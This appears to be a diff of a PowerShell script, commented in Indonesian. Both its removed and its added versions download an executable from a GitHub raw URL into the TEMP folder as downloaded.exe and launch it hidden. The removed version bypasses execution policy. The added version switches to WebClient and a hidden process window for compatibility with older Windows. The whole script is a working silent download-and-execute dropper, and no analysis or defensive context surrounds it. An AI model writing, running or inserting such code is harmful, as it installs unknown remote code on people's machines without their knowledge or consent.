@@ -1,16 +1,22 @@
 $url = "https://raw.githubusercontent.com/devilJM/m/main/m"
 $savePath = [System.IO.Path]::Combine($env:TEMP, "downloaded.exe")
 
-# Konfigurasi PowerShell Process
-$psi = New-Object System.Diagnostics.ProcessStartInfo
-$psi.FileName = "powershell"
-$psi.Arguments = "-ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command "& { 
-    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; 
-    Invoke-WebRequest -Uri '$url' -OutFile '$savePath' -ErrorAction Stop; 
-    if (Test-Path '$savePath') { Start-Process -FilePath '$savePath' -WindowStyle Normal }
-}""
-$psi.UseShellExecute = $false
-$psi.CreateNoWindow = $true
+# Pastikan TLS 1.2 digunakan agar kompatibel dengan LTSC 2016
+[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
 
-# Jalankan proses
-[System.Diagnostics.Process]::Start($psi) | Out-Null
+# Download file menggunakan metode yang lebih kompatibel
+try {
+    $client = New-Object System.Net.WebClient
+    $client.DownloadFile($url, $savePath)
+
+    # Jika file berhasil diunduh, jalankan secara tersembunyi
+    if (Test-Path $savePath) {
+        $psi = New-Object System.Diagnostics.ProcessStartInfo
+        $psi.FileName = $savePath
+        $psi.UseShellExecute = $false
+        $psi.CreateNoWindow = $true
+        [System.Diagnostics.Process]::Start($psi) | Out-Null
+    }
+} catch {
+    Write-Host "Download failed: $_"
+}
